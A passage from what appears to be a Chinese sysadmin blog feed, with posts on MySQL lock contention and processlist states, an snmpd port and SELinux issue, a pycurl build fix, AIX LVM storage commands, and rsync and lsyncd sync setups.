<p><strong>产生的原因：</strong></p>
<p>searchzh视图相关的表，update，insert，delete操作频繁。在mysql的表锁定机制中，select语句的优先级比update低。所以此select语句一直在锁队列中等待，后来的update操作会插队到select语句前面。导致| Sending data&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 614.25387 |</p>
<p><strong>解决方法有多种，最简单的</strong>：</p>
<p> select HIGH_PRIORITY * from searchzh where modified_date &gt; ‘2009-09-02 14:45:22’;</p>
<p>指定该select语句具有高优先级。</p>
<p>=======================================</p>
<p>mysql15:21:30&gt; SHOW STATUS LIKE ‘Table%’;<br>+———————–+———–+<br>| Variable_name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Value&#160;&#160;&#160;&#160; |<br>+———————–+———–+<br>| Table_locks_immediate | 120977304 |<br>| Table_locks_waited&#160;&#160;&#160; | 577&#160;&#160;&#160;&#160;&#160;&#160; |<br>+———————–+———–+</p>
<p>表锁争用现象比较严重。</p>
<p>在频繁更新和查询的情景下，使用innodb也许更好。</p>
<p>转载</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sending data </tag>
            
            <tag> status </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[snmpd服务无法更改默认端口]]></title>
      <url>/2012/08/24/snmpd-e6-9c-8d-e5-8a-a1-e6-97-a0-e6-b3-95-e6-9b-b4-e6-94-b9-e9-bb-98-e8-ae-a4-e7-ab-af-e5-8f-a3.html</url>
      <content type="html"><![CDATA[<p><strong>问题描述：</strong></p>
<p>修改/etc/rc.d/init.d/snmpd的启动脚本</p>
<p>修改行：</p>
<p>OPTIONS=&quot;-Lsd -Lf /dev/null -p /var/run/snmpd.pid -a&quot;</p>
<p>修改为</p>
<p>OPTIONS=&quot;udp:9999 -Lsd -Lf /dev/null -p /var/run/snmpd.pid -a&quot;</p>
<p>service snmpd start 时无法启动该服务，终端没有报错提示</p>
<p><strong>问题解决：</strong></p>
<p>tail&#160; -10 /var/log/messages </p>
<p>Aug 24 09:36:24 localhost snmpd[12063]: Error opening specified endpoint &quot;udp:9999&quot;<br>Aug 24 09:36:24 localhost snmpd[12063]: Server Exiting with code 1<br>Aug 24 09:36:24 localhost setroubleshoot: SELinux is preventing the snmpd (snmpd_t) from binding to port 9999. For complete SELinux messages. run sealert -l ec7e5602-a40f-4831-97d0-ca9e84618549</p>
<p>&#160;</p>
<p>so,暂且不考虑selinux，命令关掉selinux</p>
<p>setenforce&#160; 0</p>
<p>sestatus </p>
<p>SELinux status:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; enabled<br>SELinuxfs mount:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; /selinux<br>Current mode:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; permissive<br>Mode from config file:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; disabled<br>Policy version:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 21<br>Policy from config file:&#160;&#160;&#160;&#160;&#160;&#160;&#160; targeted</p>
<p>&#160;</p>
<p>稍后会继续详细介绍selinux，安全却很少人探索的东东！</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> snmpd </tag>
            
            <tag> selinux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编译python拓展pycurl抛error: command 'gcc' failed with exit status 1]]></title>
      <url>/2012/08/23/e7-bc-96-e8-af-91python-e6-8b-93-e5-b1-95pycurl-e6-8a-9berror-command-gcc-failed-with-exit-status-1.html</url>
      <content type="html"><![CDATA[<p><strong>问题描述：</strong></p>
<p>[root@localhost pycurl-7.19.0]# python setup.py install –curl-config=/usr/bin/curl-config<br>Using /usr/bin/curl-config (libcurl 7.15.5)<br>running install<br>running build<br>running build_py<br>running build_ext<br>building ‘pycurl’ extension<br>gcc -pthread -fno-strict-aliasing -g -O2 -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -fPIC -DHAVE_CURL_OPENSSL=1 -DHAVE_CURL_SSL=1 -I/usr/local/include/python2.7 -c src/pycurl.c -o build/temp.linux-x86<em>64-2.7/src/pycurl.o    
</em><strong>src/pycurl.c:61:4: error: #error &quot;Need libcurl version 7.19.0 or greater to compile pycurl.&quot;       
</strong>_src/pycurl.c:1134: error: expected declaration specifiers or ‘…’ before ‘curlsocktype’<br>src/pycurl.c:1135: warning: ‘struct curl_sockaddr’ declared inside parameter list<br>src/pycurl.c:1135: warning: its scope is only this definition or declaration, which is probably not what you want<br>src/pycurl.c: In function ‘opensocket_callback’:<br>src/pycurl.c:1148: error: dereferencing pointer to incomplete type<br>src/pycurl.c:1148: error: dereferencing pointer to incomplete type<br>src/pycurl.c:1148: error: dereferencing pointer to incomplete type<br>src/pycurl.c: In function ‘do_curl_setopt’:<br>src/pycurl.c:1624: error: ‘CURLOPT_SSH_PUBLIC_KEYFILE’ undeclared (first use in this function)<br>src/pycurl.c:1624: error: (Each undeclared identifier is reported only once<br>src/pycurl.c:1624: error: for each function it appears in.)<br>src/pycurl.c:1625: error: ‘CURLOPT_SSH_PRIVATE_KEYFILE’ undeclared (first use in this function)<br>src/pycurl.c:1626: error: ‘CURLOPT_COPYPOSTFIELDS’ undeclared (first use in this function)<br>src/pycurl.c:1627: error: ‘CURLOPT_SSH_HOST_PUBLIC_KEY_MD5’ undeclared (first use in this function)<br>src/pycurl.c:1629: error: ‘CURLOPT_ISSUERCERT’ undeclared (first use in this function)<br>src/pycurl.c:2020: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘<strong>attribute</strong>’ before ‘opensocket_cb’<br>src/pycurl.c:2020: error: ‘opensocket_cb’ undeclared (first use in this function)<br>src/pycurl.c:2071: error: ‘CURLOPT_OPENSOCKETFUNCTION’ undeclared (first use in this function)<br>src/pycurl.c:2076: error: ‘CURLOPT_OPENSOCKETDATA’ undeclared (first use in this function)<br>src/pycurl.c: In function ‘do_curl_getinfo’:<br>src/pycurl.c:2175: error: ‘CURLINFO_REDIRECT_URL’ undeclared (first use in this function)<br>src/pycurl.c:2176: error: ‘CURLINFO_PRIMARY_IP’ undeclared (first use in this function)<br>src/pycurl.c:2194: error: ‘CURLINFO_APPCONNECT_TIME’ undeclared (first use in this function)<br>src/pycurl.c: In function ‘do_multi_setopt’:<br>src/pycurl.c:2461: error: ‘CURLMOPT_PIPELINING’ undeclared (first use in this function)<br>src/pycurl.c:2464: error: ‘CURLMOPT_MAXCONNECTS’ undeclared (first use in this function)<br>src/pycurl.c:2479: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘<strong>attribute</strong>’ before ‘t_cb’<br>src/pycurl.c:2479: error: ‘t_cb’ undeclared (first use in this function)<br>src/pycurl.c:2489: error: ‘CURLMOPT_TIMERFUNCTION’ undeclared (first use in this function)<br>src/pycurl.c:2491: error: ‘CURLMOPT_TIMERDATA’ undeclared (first use in this function)<br>src/pycurl.c: In function ‘do_multi_socket_action’:<br>src/pycurl.c:2576: warning: implicit declaration of function ‘curl_multi_socket_action’<br>src/pycurl.c: In function ‘initpycurl’:<br>src/pycurl.c:3555: error: ‘CURLE_SSL_CACERT_BADFILE’ undeclared (first use in this function)<br>src/pycurl.c:3556: error: ‘CURLE_REMOTE_FILE_NOT_FOUND’ undeclared (first use in this function)<br>src/pycurl.c:3557: error: ‘CURLE_SSH’ undeclared (first use in this function)<br>src/pycurl.c:3558: error: ‘CURLE_SSL_SHUTDOWN_FAILED’ undeclared (first use in this function)<br>src/pycurl.c:3707: error: ‘CURLOPT_OPENSOCKETFUNCTION’ undeclared (first use in this function)<br>src/pycurl.c:3719: error: ‘CURLOPT_SSL_SESSIONID_CACHE’ undeclared (first use in this function)<br>src/pycurl.c:3720: error: ‘CURLOPT_SSH_AUTH_TYPES’ undeclared (first use in this function)<br>src/pycurl.c:3721: error: ‘CURLOPT_SSH_PUBLIC_KEYFILE’ undeclared (first use in this function)<br>src/pycurl.c:3722: error: ‘CURLOPT_SSH_PRIVATE_KEYFILE’ undeclared (first use in this function)<br>src/pycurl.c:3723: error: ‘CURLOPT_FTP_SSL_CCC’ undeclared (first use in this function)<br>src/pycurl.c:3724: error: ‘CURLOPT_TIMEOUT_MS’ undeclared (first use in this function)<br>src/pycurl.c:3725: error: ‘CURLOPT_CONNECTTIMEOUT_MS’ undeclared (first use in this function)<br>src/pycurl.c:3726: error: ‘CURLOPT_HTTP_TRANSFER_DECODING’ undeclared (first use in this function)<br>src/pycurl.c:3727: error: ‘CURLOPT_HTTP_CONTENT_DECODING’ undeclared (first use in this function)<br>src/pycurl.c:3728: error: ‘CURLOPT_NEW_FILE_PERMS’ undeclared (first use in this function)<br>src/pycurl.c:3729: error: ‘CURLOPT_NEW_DIRECTORY_PERMS’ undeclared (first use in this function)<br>src/pycurl.c:3730: error: ‘CURLOPT_POST301’ undeclared (first use in this function)<br>src/pycurl.c:3731: error: ‘CURLOPT_PROXY_TRANSFER_MODE’ undeclared (first use in this function)<br>src/pycurl.c:3732: error: ‘CURLOPT_COPYPOSTFIELDS’ undeclared (first use in this function)<br>src/pycurl.c:3733: error: ‘CURLOPT_SSH_HOST_PUBLIC_KEY_MD5’ undeclared (first use in this function)<br>src/pycurl.c:3736: error: ‘CURLOPT_ISSUERCERT’ undeclared (first use in this function)<br>src/pycurl.c:3737: error: ‘CURLOPT_ADDRESS_SCOPE’ undeclared (first use in this function)<br>src/pycurl.c:3739: error: ‘CURLMOPT_TIMERFUNCTION’ undeclared (first use in this function)<br>src/pycurl.c:3741: error: ‘CURLMOPT_PIPELINING’ undeclared (first use in this function)<br>src/pycurl.c:3742: error: ‘CURLMOPT_MAXCONNECTS’ undeclared (first use in this function)<br>src/pycurl.c:3773: error: ‘CURLSSH_AUTH_ANY’ undeclared (first use in this function)<br>src/pycurl.c:3774: error: ‘CURLSSH_AUTH_NONE’ undeclared (first use in this function)<br>src/pycurl.c:3775: error: ‘CURLSSH_AUTH_PUBLICKEY’ undeclared (first use in this function)<br>src/pycurl.c:3776: error: ‘CURLSSH_AUTH_PASSWORD’ undeclared (first use in this function)<br>src/pycurl.c:3777: error: ‘CURLSSH_AUTH_HOST’ undeclared (first use in this function)<br>src/pycurl.c:3778: error: ‘CURLSSH_AUTH_KEYBOARD’ undeclared (first use in this function)<br>src/pycurl.c:3779: error: ‘CURLSSH_AUTH_DEFAULT’ undeclared (first use in this function)<br>src/pycurl.c:3788: error: ‘CURLINFO_APPCONNECT_TIME’ undeclared (first use in this function)<br>src/pycurl.c:3804: error: ‘CURLINFO_REDIRECT_URL’ undeclared (first use in this function)<br>src/pycurl.c:3805: error: ‘CURLINFO_PRIMARY_IP’ undeclared (first use in this function)<br>src/pycurl.c:3825: error: ‘CURL_CSELECT_IN’ undeclared (first use in this function)<br>src/pycurl.c:3826: error: ‘CURL_CSELECT_OUT’ undeclared (first use in this function)<br>src/pycurl.c:3827: error: ‘CURL_CSELECT_ERR’ undeclared (first use in this function)<br>error: command ‘gcc’ failed with exit status 1</p>
<p>&#160;</p>
<p><strong>问题解决：</strong></p>
<p>其中有一句<br>src/pycurl.c:61:4: error: #error &quot;Need libcurl version 7.19.0 or greater to compile pycurl.&quot;</p>
<p>提示说libcurl 版本太低…<br>root@localhost pycurl-7.19.0]# curl –version<br>curl 7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5<br>Protocols: tftp ftp telnet dict ldap http file https ftps<br>Features: GSS-Negotiate IDN IPv6 Largefile NTLM SSL libz<br>果然7.15.5小于 7.19<br>wget <a href="http://curl.haxx.se/download/curl-7.21.4.tar.gz" target="_blank" rel="external">http://curl.haxx.se/download/curl-7.21.4.tar.gz</a><br>.configure ＆＆make &amp;&amp; make install</p>
<p>&#160;</p>
<p>下面继续问题<br>[root@localhost pycurl-7.19.0]# python<br>Python 2.4.3 (#1, Sep&#160; 3 2009, 15:37:37)<br>[GCC 4.1.2 20080704 (Red Hat 4.1.2-46)] on linux2<br>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.<br>&gt;&gt;&gt; import pycurl<br>Traceback (most recent call last):<br>&#160; File &quot;&lt;stdin&gt;&quot;, line 1, in ?<br>ImportError: libcurl.so.4: cannot open shared object file: No such file or directory<br>&gt;&gt;&gt;     </p>
<p>这问题因为机器是64的.所以找不到.<br>解决方法：    </p>
<p>[root@localhost pycurl-7.19.0]# find /usr -name &quot;libcurl.so*&quot;<br>/usr/local/src/curl-7.21.4/lib/.libs/libcurl.so<br>/usr/local/src/curl-7.21.4/lib/.libs/libcurl.so.4<br>/usr/local/src/curl-7.21.4/lib/.libs/libcurl.so.4.2.0<br>/usr/local/lib/libcurl.so<br>/usr/local/lib/libcurl.so.4<br>/usr/local/lib/libcurl.so.4.2.0<br>/usr/lib/libcurl.so.3.0.0<br>/usr/lib/libcurl.so.3<br>/usr/lib/libcurl.so<br>/usr/lib64/libcurl.so.3.0.0<br>/usr/lib64/libcurl.so.3<br>/usr/lib64/libcurl.so<br>[root@localhost pycurl-7.19.0]# ln -s&#160; /usr/local/lib/libcurl.so.4.2.0 /usr/lib64/libcurl.so.4<br>[root@localhost pycurl-7.19.0]# python<br>Python 2.4.3 (#1, Sep&#160; 3 2009, 15:37:37)<br>[GCC 4.1.2 20080704 (Red Hat 4.1.2-46)] on linux2<br>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.<br>&gt;&gt;&gt; import pycurl<br>&gt;&gt;&gt;<br>[root@localhost pycurl-7.19.0]# ls /usr/local/lib/libcurl.so.4 -l<br>lrwxrwxrwx 1 root root 16 Apr 11 22:50 /usr/local/lib/libcurl.so.4 -&gt; libcurl.so.4.2.0    </p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> command &#39;gcc&#39; failed with exit status 1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[AIX 学习笔记之 存储管理 LV PV VG PP]]></title>
      <url>/2012/08/19/aix-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-e4-b9-8b-e5-ad-98-e5-82-a8-e7-ae-a1-e7-90-86-lv-pv-vg-pp.html</url>
      <content type="html"><![CDATA[<p>1.基本概念：<br>PV 物理卷：普通的直接访问的存储设备，有固定的和可移动的之分，代表性的就是硬盘。<br>vg 卷组：AIX中最大的存储单位，一个卷组由一组物理硬盘组成，也就是由一个或多个物理卷组成。<br>pp 物理分区：是把物理卷划分成连续的大小相等的存储单位，一个卷组中的物理分区大小都相等。<br>lp 逻辑分区：适映射物理分区的逻辑单位，一个逻辑分区可以对应一个也可以对应多个物理分区。<br>lv 逻辑卷：是指卷组中由多个逻辑分区组成的集合，逻辑卷中的逻辑分区是连续的，但是对应的物理分   区是不连续的，可以在一个磁盘上，也可以在不同的磁盘上。<br>fs 文件系统：是指在AIX系统中面向用户的存储空间。一个逻辑卷只能创建一个文件系统，也就是说一个    文件系统对应一个逻辑卷，如果删除逻辑卷也将删除文件系统。</p>
<p>2.存储结构：<br>逻辑卷lv 不能被直接访问，是生设备（裸设备），逻辑卷上建文件系统，文件系统可以被用户访问，市熟设备。文件系统里建目录，目录下建文件。</p>
<p>物理卷，卷组，物理分区，逻辑卷，逻辑分区，逻辑卷是面向操作系统的概念<br>文件系统，目录，文件是面向用户的概念。</p>
<p>3.LVM的配置数据<br>卷组描述区(VGDA):描述卷组中的所有物理卷和逻辑卷的对应关系<br>卷组状态区(VGSA)：记录卷组中物理卷和物理分区的状态信息，在卷组激活时，确定哪些物理分区可用<br>逻辑卷控制块(LVCB)：位于每个逻辑卷开头，包含逻辑卷的信息，占用数百个字节</p>
<p>LVM管理命令就是对VGDA内容的更新，当一块硬盘变成PV时，这个硬盘开始保留一部分空间存放VGDA信息，当把它加入卷组中时，开始将卷组信息写入VGDA区域，当把它从卷组删除时，也同时清除VGDA数据，这个数据还存在于AIX系统的ODM库中，当导入一个卷组时，把VGDA信息写入ODM，导出时删除。</p>
<p>4.磁盘Quorum<br>卷组的每一个物理卷至少包含着一份VGDA和VGSA。当一个卷组只有一块硬盘时，这块硬盘存有两份VGDA和VGSA,当这个卷组由两块硬盘时，其中一块存有两份，另一块存有一份，当卷组由三块以上硬盘时，每块硬盘存有一份。 如果磁盘Quorum存在，则必须保证卷组有51%以上的VGDA/VGSA可以正常访问。淡然也可以关闭磁盘Quorum。</p>
<p>5.逻辑存储管理的限制<br>VG数：每个系统最多255个VG<br>PV数：对于普通卷组，每个VG最多32个PV,对于大VG，每个卷组最多128个PV<br>PP数：每个PV最多有1016个PP<br>LV数：对于普通VG，每个卷组最多255个LV,对于大VG，每个VG最多512个LV<br>LP数：每个LV最多有32512个LP<br>PP和LP的大小：1M到1024M 必须是2的幂次方<br>LP映射PP的数量：一个LP可以映射1-3个PP</p>
<p>6.物理区域的分布<br>外边缘(Outer-Edge)：存放很少访问的数据<br>外中间(Outer-Middle)：创建逻辑卷时默认的位置<br>中间(Center):磁盘搜索时间最短，速度最快。<br>内中间(Inner-Middle)：比中间稍慢一些<br>内边缘(Inner-Edge)存放很少访问的数据</p>
<p>7.向系统添加一块硬盘<br>方法一：<br>添加硬盘后起动机器，自动运行cfgmgr,直接查看结果，如果没有识别再手工配置。</p>
<p>#cfgmgr -v</p>
<p>#lspv</p>
<p>#chdev -l hdisk2 -a pv=yes</p>
<p>方法二：<br>系统不能重起时，县查看原有硬盘，然后安装新硬盘，检查新设备，配置新设备</p>
<p>#lspv</p>
<p>#cfgmgr -v</p>
<p>#lspv</p>
<p>#chdev -l hdisk2 -a pv=yes</p>
<p>#mkdev -c disk -s scsi -t 670mb -p scsi3 -w 6,0 -a pv=yes</p>
<p>#smit makdsk</p>
<p>8.修改物理卷属性</p>
<p>#chpv -a n hdisk1    禁止hdisk1在分配新的PP</p>
<p>#chpv -a y hdisk1    允许</p>
<p>#chpv -v r hdisk1    关闭hdisk1的可用性，无法通过逻辑形式读写和访问该物理卷</p>
<p>#chpv -v a hdisk1    允许</p>
<p>#chpv -c hdisk1      清除hdisk1上的引导记录</p>
<p>#smit chpv</p>
<p>9.显示物理卷信息</p>
<p>#lsdev -Cc disk 显示系统一定义和已配置的物理卷</p>
<p>#lspv            以不带任何参数的形式显示系统中所有物理卷信息 </p>
<p>#lspv hdisk0     显示一个物理卷hdisk0的属性</p>
<p>#lspv -l hdisk0 显示物理卷hdisk0上分布的逻辑卷。</p>
<p>#lspv -p hdisk0 显示物理卷上每个逻辑卷物理分区的分布情况，同时显示逻辑卷类型和文件mount点。</p>
<p>#lspv -M hdisk0 显示物理分区和逻辑分区的对应情况。</p>
<p>10迁移物理卷上的内容：</p>
<p>a.确定系统中有哪些磁盘可用</p>
<p>#lsdev -Cc dev</p>
<p>#lspv</p>
<p>#extendvg rootvg hdisk5</p>
<p>b.检查卷组中包含哪些磁盘，确认源磁盘和目标磁盘在同一个卷组中，</p>
<p>#lsvg -p rootvg</p>
<p>c.确定目的盘上有足够的空间存放源盘的内容</p>
<p>#lspv hdisk0 |grep “USED PPs”</p>
<p>#lspv hdisk5 |grep “USED PPs”</p>
<p>d.如果是rootvg 上的磁盘，检查引导逻辑卷是否在源磁盘上</p>
<p>#lspv -l hdisk0 |grep hd5</p>
<p>#megratepv -l hd5 hdisk0 hdisk5</p>
<p>e.重设系统引导记录</p>
<p>#bosboot -a -d /dev/hdisk5</p>
<p>#bosboot -m normal hdisk5</p>
<p>#mkboot -c -d /dev/hdisk0</p>
<p>f.迁移</p>
<p>#smit migratevg</p>
<p>#migratevg hdisk0 hdisk5</p>
<p>#migratevg -l lv01 hdisk0 hdisk5</p>
<p>g.删除原盘数据</p>
<p>#reducevg rootvg hdisk0</p>
<p>#rmdev -dl hdisk0</p>
<p>11.卷组管理</p>
<p>#mkvg -y datavg -d 6 -s 8 hdisk7 hdisk8</p>
<p>#smit mkvg      创建卷组是保证/etc/vg下有2M空间</p>
<p>#lsvg           查看系统所有VG</p>
<p>#lsvg -o        查看激活状态的VG</p>
<p>#lsvg rootvg    查看rootvg属性</p>
<p>#lsvg -l rootvg 查看rootvg里的LV</p>
<p>#lsvg -p rootvg 查看rootvg中包含的物理卷</p>
<p>#chvg -ay datavg 使卷组启动时自动激活</p>
<p>#chvg -an datavg 使卷组启动时不能自动激活</p>
<p>#chvg -u datavg 给卷组解锁</p>
<p>#extendvg datavg hdisk5</p>
<p>#reducevg datavg hdisk5</p>
<p>#varyonvg datavg</p>
<p>#varyoffvg datavg</p>
<p>#exportvg datavg</p>
<p>#importvg -y datavg hdisk5</p>
<p>#syncvg -p hdisk03 hdisk05   同步物理卷</p>
<p>#syncvg -v vg05 vg06         同步卷组vg05和vg06上的拷贝</p>
<p>#redefinevg -d hdisk0 rootvg   在ODM库中重定义卷组信息，</p>
<p>#swapoff paging_spce_name 使页面空间处于非活动状态</p>
<p>#mirrorvg -c 3 datavg   做3份拷贝的卷组镜像</p>
<p>#mirrorvg -S -c 3 datavg    后台同步</p>
<p>镜像环境中替换磁盘</p>
<p>#unmirrorvg datavg hdiak7   删除hdisk7上的镜像</p>
<p>#reduncevg datavg hdisk7    在卷组中删除hdisk7</p>
<p>#rmdev -dl hdisk7           在系统中删除hdisk7</p>
<p>#extendvg datavg hdisk7     将新盘加入datavg</p>
<p>#mirrorvg datavg            给卷组datavg做镜像</p>
<p>#unmirrorvg                 取消卷组镜像</p>
<p>12.逻辑卷管理</p>
<p>#getlvcb -TA hd2   查看逻辑卷控制块信息</p>
<p>#lsvg -l rootvg 查看rootvg上的逻辑卷信息</p>
<p>#lslv mylv        查看一个lv的详细属性</p>
<p>#lslv -l lv_01   显示一个逻辑卷所跨越的物理卷，以及PP在物理卷上的分布情况</p>
<p>#lslv -p hdisk1 显示物理卷上的逻辑卷分配图</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[rsync , rsync + ssh, rsync + lsyncd 多种同步方案与比较]]></title>
      <url>/2012/08/15/rsync-rsync-ssh-rsync-lsyncd-e5-a4-9a-e7-a7-8d-e5-90-8c-e6-ad-a5-e6-96-b9-e6-a1-88-e4-b8-8e-e6-af-94-e8-be-83.html</url>
      <content type="html"><![CDATA[<p>1. 利用 ssh+rsync<br> 只需要在服务器端打开 ssh 服务, 并启动 xinetd 中 rsync 服务则可使用<br> a. 增量同步<br>&#160; rsync -av /src-dir/.&#160; <a href="mailto:user@ipadress:/dest-dir/" target="_blank" rel="external">user@ipadress:/dest-dir/</a>.<br> b. 镜像同步<br>&#160; rsync -av –delete /src-dir/.&#160; <a href="mailto:user@ipadress:/dest-dir/" target="_blank" rel="external">user@ipadress:/dest-dir/</a>.<br> 特点: 配置简单, 不需要配置 rsyncd.conf 配置文件, 但需要在同步过程中进行用户认证<br> 注: 利用 expact + gzipexe 可以创建自动同步加密脚本<br> 使用: 可手动同步或每天晚上定制时间任务同步<br> 缺点:无法实现实时同步, 不可以成为双机热备份方案么 </p>
<p>2. 启用 rsync 服务<br> 需要配置 /etc/rsyncd.conf 配置文件, 需要启动 xinetd 中 rsync 服务, 可以不通过 sshd 协调<br> a. 配置文件 (参考&#160; man 5 rsyncd.conf , 目录共享管理参考 smb.conf)</p>
<p>rsyncd.conf 参考<br>motd file = true&#160;&#160;&#160;&#160; # 时间记录<br>pid file = /var/run/rsyncd.pid<br>port = 873<br>address = 0.0.0.0<br>log file = /var/log/rsyncd.log&#160; # rsync 独立日志, 记录每个文件更新信息<br>syslog facility = syslog&#160;&#160; # 增加同步启动与结束信息到 /var/log/messages 仲<br>uid = nobody&#160;&#160;&#160;&#160;&#160; # 注: 定义同步时 rsync 进程用户 id<br>gid = nobody<br>use chroot = no</p>
<p>[share]<br>path=/tmp/test<br>read only=false</p>
<p>rsyncd.conf 配置安全信息:<br>charset 用于设定字符集, 可用字符集参考 smb.conf 标准<br>max connections 并发连接数量<br>read only&#160; 读写控制<br>write only 读写控制<br>list&#160; 是否允许客户端利用&#160; rsync –list-only rsync://192.168.1.11:873 查询共享目录信息<br> 注: rsync –list-only rsync://192.168.1.11:873/share/. 能够列出文件信息, 与 list 参数无关<br>exclude 同步过程中忽略某个文件或目录 ex: = new/ old/ kdump.conf (注:只需要相对路径)<br>exclude from = /etc/rsyncd.list 以文件记录同步过程忽略信息<br>incoming chmod 文件目录权限定义<br>outgoing chmod 文件目录权限定义<br>auth users 配合 secrets file 使用, 定义用户认证(明文) = user1 user2 user3<br>secrets file = filepath 验证文件 语法 user:password (必须包含上述user123) 文件 root 600 属性<br>hosts allow 主机 IP 定义<br>hosts deny 主机 IP 定义<br>log format 默认格式 %o %h [%a] %m (%u) %f %l 参考 rsyncd.conf </p>
<p> 常见同步语法<br> rsync –list-only rsync://192.168.1.11:873/share/. 能够列出文件信息<br> rsync –list-only rsync://192.168.1.11:873 查询共享目录信息<br> rsync –exclude-from=file.txt rsync://192.168.1.11:873/share/.&#160; /tmp/test/. 不同步指定信息</p>
<p> 优点: 避免显示主机文件信息绝对路径, 多种安全设定, 不需要利用ssh 进行用户验证, 支持匿名同步<br> 缺点: 无法主动推送文件</p>
<p>3. rsync+lsyncd 数据同步</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160; [rsync server ]&#160; &lt;——&#160;&#160;&#160;&#160; [ lsyncd ]&#160;&#160;&#160; —&gt;&#160; [ rsync server ]</p>
<p>rsync 客户端需要编译 lsyncd 软件,安装 rsync 工具<br>rsync 服务器需要配置并启动 rsync 进程, 如上例子, 匿名共享 share 目录</p>
<p>下载最新版<br><a href="http://lsyncd.googlecode.com/files/lsyncd-2.0.5.tar.gz" target="_blank" rel="external">http://lsyncd.googlecode.com/files/lsyncd-2.0.5.tar.gz</a><br>依赖: lua &gt;= 5.1.3, rhel6 补丁<br><a href="ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/6rolling/i386/os/Packages/lua-devel-5.1.4-4.1.el6.i686.rpm" target="_blank" rel="external">ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/6rolling/i386/os/Packages/lua-devel-5.1.4-4.1.el6.i686.rpm</a></p>
<p>语法需调用 LUA 格式</p>
<p>创建配置文件 share.lua</p>
<p>settings = {&#160;<br>.. 略<br> nodaemon&#160;&#160; = true,&#160;&#160;&#160; # false 成为前台进程, 方便测试<br> statusInterval = 3,&#160;&#160;&#160; # lsyncd.status 状态更新时间间隔<br> …略<br>}</p>
<p>sync{<br> ..&#160; 略<br>}</p>
<p>bash = {&#160;&#160;&#160;&#160;<br> … 略<br>}</p>
<p>settings 为主配置, sync 为同步配置, bash 为同步方案</p>
<p>启动方法<br>lsyncd&#160; share.lua</p>
<p>初次启动则会自动同步文件内容, 后发生文件修改, 增加, 删除都会进行自动同步<br>如果需要对多台电脑进行同步, 可以利用 lsyncd&#160; backup.lua 等脚本多次进行进程启动</p>
<p> 方案优点:<br>&#160; 1. 自动对目录中文件向 rsync 服务器进行推送<br>&#160; 2. 能够支持多台 rsync 服务器<br>&#160; 3. 避免人工参与修改<br> 缺点:<br>&#160; 同步时间非实时, 约莫具有30秒延时<br>&#160; 不建议采用大文件进行同步</p>
<p>&#160;</p>
<p>转自TerrySang</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rsync </tag>
            
            <tag> rsync+lsyncd </tag>
            
            <tag> rsync+ssh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[show processlist结果中status状态总结]]></title>
      <url>/2012/08/15/show-processlist-e7-bb-93-e6-9e-9c-e4-b8-adstatus-e7-8a-b6-e6-80-81-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<p>&#160;</p>
<p>在Show processlist输出中的Status项: 5.1手册中没有的或者翻译有问题的，都附带5.5原文说明：</p>
<h5 id="After-create"><a href="#After-create" class="headerlink" title="After create"></a>After create</h5><p>This occurs when the thread creates a table (including internal temporary tables), at the end of the function that creates the table. This state is used even if the table could not be created due to some error.</p>
<p>这个状态当线程创建一个表（包括内部临时表）时，在这个建表功能结束时出现。即使某些错误导致建表失败，也会使用这个状态。</p>
<h5 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h5><p>The thread is calculating a MyISAM table key distributions (for example, for ANALYZE TABLE).</p>
<p>当计算MyISAM表索引分布时。（比如进行ANALYZE TABLE时）</p>
<h5 id="checking-permissions"><a href="#checking-permissions" class="headerlink" title="checking permissions"></a>checking permissions</h5><p>The thread is checking whether the server has the required privileges to execute the statement.</p>
<p>这个线程检查服务器是否有具有执行该语句的所需权限。</p>
<h5 id="Checking-table"><a href="#Checking-table" class="headerlink" title="Checking table"></a>Checking table</h5><p>The thread is performing a table check operation.</p>
<p>线程正在执行表检查操作。</p>
<h5 id="cleaning-up"><a href="#cleaning-up" class="headerlink" title="cleaning up"></a>cleaning up</h5><p>The thread has processed one command and is preparing to free memory and reset certain state variables.</p>
<p>线程处理一个命令，并正准备释放内存和重置某些状态变量。</p>
